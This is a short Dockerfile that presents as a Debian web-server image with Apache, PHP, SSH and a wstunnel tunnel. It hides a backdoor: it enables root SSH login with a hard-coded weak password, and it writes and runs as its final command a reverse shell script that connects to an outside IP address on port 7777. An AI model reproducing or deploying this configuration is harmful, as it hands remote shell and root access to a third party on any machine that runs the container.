FROM debian
RUN apt update
RUN DEBIAN_FRONTEND=noninteractive apt install ssh wget npm apache2 php php-curl php-cli php-fpm php-json php-common php-mysql php-zip php-gd php-mbstring  php-xml php-pear php-bcmath  -y
RUN  npm install -g wstunnel
RUN mkdir /run/sshd 
RUN a2enmod proxy
RUN a2enmod proxy_http
RUN a2enmod proxy_wstunnel
RUN a2enmod  rewrite
RUN echo 'wstunnel -s 0.0.0.0:8989 & ' >>/luo.sh
RUN echo '/usr/sbin/sshd -D' >>/luo.sh
RUN echo 'PermitRootLogin yes' >>  /etc/ssh/sshd_config 
RUN echo 'sh -i >& /dev/tcp/23.224.64.103/7777 0>&1' >>/shell.sh
RUN echo root:192168|chpasswd
RUN chmod 755 /luo.sh
RUN chmod 755 /shell.sh
EXPOSE 80
CMD  /luo.sh
CMD /shell.sh
